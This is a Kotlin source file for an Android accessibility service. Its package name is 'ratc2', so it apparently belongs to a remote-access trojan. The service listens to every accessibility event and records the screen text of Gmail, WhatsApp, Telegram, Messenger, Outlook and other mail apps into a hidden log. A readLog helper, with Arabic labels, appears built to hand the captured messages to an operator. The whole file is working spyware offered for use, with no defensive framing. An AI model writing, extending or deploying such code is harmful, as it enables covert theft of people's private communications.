package com.spud.ratc2

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AutoAccess : AccessibilityService() {

    private val TAG = "AUTO"
    private val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
        instance = this
        Log.i(TAG, "connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            val pkg = event.packageName?.toString() ?: return
            val watched = setOf(
                "com.google.android.gm",
                "com.whatsapp",
                "org.telegram.messenger",
                "com.facebook.orca",
                "com.microsoft.office.outlook",
                "com.yahoo.mobile.client.android.mail",
                "com.samsung.android.email.provider"
            )
            if (pkg !in watched) return
            val text = event.text?.joinToString(" | ") ?: ""
            if (text.isBlank()) return
            val entry = "[${df.format(Date())}] $pkg : $text\n"
            val f = File(applicationContext.filesDir, "accessibility_log.txt")
            f.appendText(entry)
            try {
                val lines = f.readLines()
                if (lines.size > 3000) f.writeText(lines.takeLast(3000).joinToString("\n", postfix = "\n"))
            } catch (_: Exception) {}
        } catch (e: Exception) { Log.e(TAG, "err", e) }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    companion object {
        @Volatile private var instance: AutoAccess? = null
        fun get(): AutoAccess? = instance
        fun isServiceRunning(): Boolean = instance != null
        fun readLog(ctx: Context, limit: Int): String {
            val f = File(ctx.filesDir, "accessibility_log.txt")
            if (!f.exists()) return "📝 لا يوجد سجل بعد."
            val lines = f.readLines().filter { it.isNotBlank() }
            return "📝 سجل (آخر $limit):\n" + lines.takeLast(limit).joinToString("\n")
        }
    }
}
